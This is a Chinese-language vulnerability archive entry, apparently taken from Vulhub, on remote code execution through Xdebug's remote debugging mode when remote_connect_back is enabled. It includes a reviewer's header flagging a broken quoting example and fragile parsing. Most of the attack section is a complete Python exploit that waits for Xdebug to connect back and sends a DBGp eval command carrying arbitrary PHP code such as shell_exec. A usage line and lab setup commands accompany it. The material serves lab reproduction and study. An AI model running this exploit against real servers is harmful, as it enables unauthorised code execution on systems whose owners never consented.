---
source: "历史归档批(无原始出处标注)"
product: "Xdebug/DBGp反连"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "PHP-XDebug-远程调试模式导致代码执行"
prerequisites: "来源所述条件，未列明部分仍待核：配置名为Xdebug2时代remote_*，需标版本，Xdebug3配置不同"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-a2af3ee728823d77e3507f58"
entity_id: "ve-a2af3ee728823d77e3507f58"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：配置名为Xdebug2时代remote_*，需标版本，Xdebug3配置不同

代码与实验材料：完整Python3 listener与trigger，shell引号示例错误，DBGp XML解析假设固定四块可能挂起/越界

来源证据范围：Xdebug官方、ricterz研究和Vulhub脚本，来源较好

- **结论使用边界（1）**：命令示例引号破坏PHP代码；依据：-c 'shell_exec('id');'在shell拼接后丢失PHP字符串引号。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **结论使用边界（2）**：无法用HTTP复现措辞过绝对；依据：HTTP用于触发，命令交互用DBGp；反连可达不必必须公网IP。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **适用与权限边界（3）**：版本与协议失败边界需明示；依据：remote_connect_back只适用旧配置；无数据时blocks\[3\]访问和固定NUL分帧假设脆弱。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# PHP XDebug 远程调试模式导致代码执行

## 漏洞描述

XDebug 是 PHP 的一个扩展，用于调试 PHP 代码。如果目标开启了远程调试模式，并设置 `remote_connect_back = 1`：

```
xdebug.remote_connect_back = 1
xdebug.remote_enable = 1
```

这个配置下，我们访问 `http://target/index.php?XDEBUG_SESSION_START=phpstorm`，目标服务器的 XDebug 将会连接访问者的 IP（或 `X-Forwarded-For` 头指定的地址）并通过 dbgp 协议与其通信，我们通过 dbgp 中提供的 eval 方法即可在目标服务器上执行任意 PHP 代码。

更多说明可参考：

 - https://xdebug.org
 - https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface

## 环境搭建

Vulhub 编译及启动测试环境：

```
docker compose build
docker compose up -d
```

启动完成后，访问 `http://your-ip:8080/` 即可发现主页是一个简单的 phpinfo，在其中可以找到 xdebug 的配置，可见开启了远程调试。



## 漏洞复现

因为需要使用 dbgp 协议与目标服务器通信，所以无法用 http 协议复现漏洞。

Vulhub 提供了 [exp.py](https://github.com/vulhub/vulhub/blob/master/php/xdebug-rce/exp.py)，指定目标 web 地址、待执行的 php 代码即可：

```
# 要求用python3并安装requests库
python3 exp.py -t http://127.0.0.1:8080/index.php -c 'shell_exec('id');'
```



**重要说明：因为该通信是一个反向连接的过程，exp.py 启动后其实是会监听本地的 9000 端口（可通过 -l 参数指定）并等待 XDebug 前来连接，所以执行该脚本的服务器必须有外网 IP（或者与目标服务器处于同一内网）。**

## 漏洞 POC

exp.py

```python
#!/usr/bin/env python3
import re
import sys
import time
import requests
import argparse
import socket
import base64
import binascii
from concurrent.futures import ThreadPoolExecutor


pool = ThreadPoolExecutor(1)
session = requests.session()
session.headers = {
    'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'
}

def recv_xml(sock):
    blocks = []
    data = b''
    while True:
        try:
            data = data + sock.recv(1024)
        except socket.error as e:
            break
        if not data:
            break

        while data:
            eop = data.find(b'\x00')
            if eop < 0:
                break
            blocks.append(data[:eop])
            data = data[eop+1:]

        if len(blocks) >= 4:
            break
    
    return blocks[3]


def trigger(url):
    time.sleep(2)
    try:
        session.get(url + '?XDEBUG_SESSION_START=phpstorm', timeout=0.1)
    except:
        pass


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='XDebug remote debug code execution.')
    parser.add_argument('-c', '--code', required=True, help='the code you want to execute.')
    parser.add_argument('-t', '--target', required=True, help='target url.')
    parser.add_argument('-l', '--listen', default=9000, type=int, help='local port')
    args = parser.parse_args()
    
    ip_port = ('0.0.0.0', args.listen)
    sk = socket.socket()
    sk.settimeout(10)
    sk.bind(ip_port)
    sk.listen(5)

    pool.submit(trigger, args.target)
    conn, addr = sk.accept()
    conn.sendall(b''.join([b'eval -i 1 -- ', base64.b64encode(args.code.encode()), b'\x00']))

    data = recv_xml(conn)
    print('[+] Recieve data: ' + data.decode())
    g = re.search(rb'<\!\[CDATA\[([a-z0-9=\./\+]+)\]\]>', data, re.I)
    if not g:
        print('[-] No result...')
        sys.exit(0)

    data = g.group(1)

    try:
        print('[+] Result: ' + base64.b64decode(data).decode())
    except binascii.Error:
        print('[-] May be not string result...')

```
